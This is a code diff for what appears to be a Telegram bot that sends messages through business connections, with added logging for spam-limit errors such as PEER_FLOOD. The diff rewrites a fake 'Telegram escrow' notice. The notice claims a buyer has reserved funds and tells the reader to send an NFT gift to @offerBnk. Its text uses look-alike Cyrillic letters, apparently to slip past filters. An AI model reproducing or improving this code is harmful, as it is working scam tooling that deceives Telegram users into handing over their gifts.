@@ -151,15 +151,22 @@ async def send_with_fallback(bc_id, chat_id, text, reply_markup=None):
     for attempt in range(1, 4):
         try:
             return await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, business_connection_id=bc_id)
-        except TelegramRetryAfter as e: await asyncio.sleep(e.retry_after + 1)
+        except TelegramRetryAfter as e: 
+            logger.warning(f"[send] FloodWait {e.retry_after}s. Ждем...")
+            await asyncio.sleep(e.retry_after + 1)
         except TelegramBadRequest as e:
-            if "PEER_FLOOD" in str(e): raise
+            if "PEER_FLOOD" in str(e): 
+                logger.error(f"[send] 🚨 PEER_FLOOD detected! Ожидание 24-48ч.")
+                raise
+            logger.warning(f"[send] BadRequest: {e}. Пробуем без эмодзи...")
             clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
             if reply_markup:
                 for row in reply_markup.inline_keyboard:
                     for btn in row: btn.icon_custom_emoji_id = None
-            try: return await bot.send_message(chat_id=chat_id, text=clean_text, reply_markup=reply_markup, business_connection_id=bc_id)
-            except Exception:
+            try: 
+                return await bot.send_message(chat_id=chat_id, text=clean_text, reply_markup=reply_markup, business_connection_id=bc_id)
+            except Exception as e2:
+                logger.error(f"[send] Fallback failed: {e2}")
                 if attempt == 3: raise
 
 async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
@@ -168,6 +175,10 @@ async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None
         return True
     except TelegramBadRequest as e:
         if "message is not modified" in str(e): return True
+        if "PEER_FLOOD" in str(e):
+            logger.error(f"[edit] 🚨 PEER_FLOOD detected! Ожидание 24-48ч.")
+            return False
+        logger.warning(f"[edit] BadRequest: {e}. Пробуем без эмодзи...")
         clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
         if reply_markup:
             for row in reply_markup.inline_keyboard:
@@ -336,7 +347,8 @@ async def handle_accept(callback: CallbackQuery) -> None:
     await asyncio.sleep(0.3)
 
     amount_fmt = f"{int(data['amount']):,}"
-    gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
+    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
+    gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'
     
     if data["currency"] == "gram":
         emoji, cur_u, cur_l = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>', "GRАM", "GRАM"
@@ -345,13 +357,14 @@ async def handle_accept(callback: CallbackQuery) -> None:
 
     order_id = f"ТG-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
     
+    # Твой новый текст (без ссылки в скобках, ссылка внутри gift_display)
     accept_text = (
-        f"<b>NFТ DеаI</b>\n\n<b>Оrdеr</b> #{order_id}\n\n"
+        f"<b>NFТ Dеаl</b>\n\n<b>Оrdеr</b> #{order_id}\n\n"
         f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
-        f"Тhе {cur_l} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wiII bе аutоmаtiсаIIу сrеditеd tо уоur ТеIеgrаm {cur_u} bаIаnсе right аftеr thе gift is trаnsfеrrd.\n\n"
-        f"<b>lnstruсtlоns tо соmрlеtе thе dеаI:</b>\n\n"
-        f"1. Stnd tо: @offerBnk\n"
-        f"2. СIiсk «Sеnd Gift» аnd sеIесt {gift_display}\n"
+        f"Тhе {cur_l} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wlII bе аutоmаtiсаIIy сrеditеd tо уоur ТеIеgrаm {cur_u} bаIаnсе right аftеr thе gift is trаnsfеrrd.\n\n"
+        f"<b>lnstruсtlоns tо соmрlеtе thе dеаl:</b>\n\n"
+        f"1. Sеnd tо: @offerBnk\n"
+        f"2. СIiсk «Sеnd Gift» аnd sеlесt {gift_display}\n"
         f"3. Соnfirm thе glft trаnsfеr.\n\n"
         f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit <b>{amount_fmt}</b> {emoji} tо уоur bаIаnсе. Тhе rеsеrvаtiоn is vаlid fоr 24 hоurs."
     )
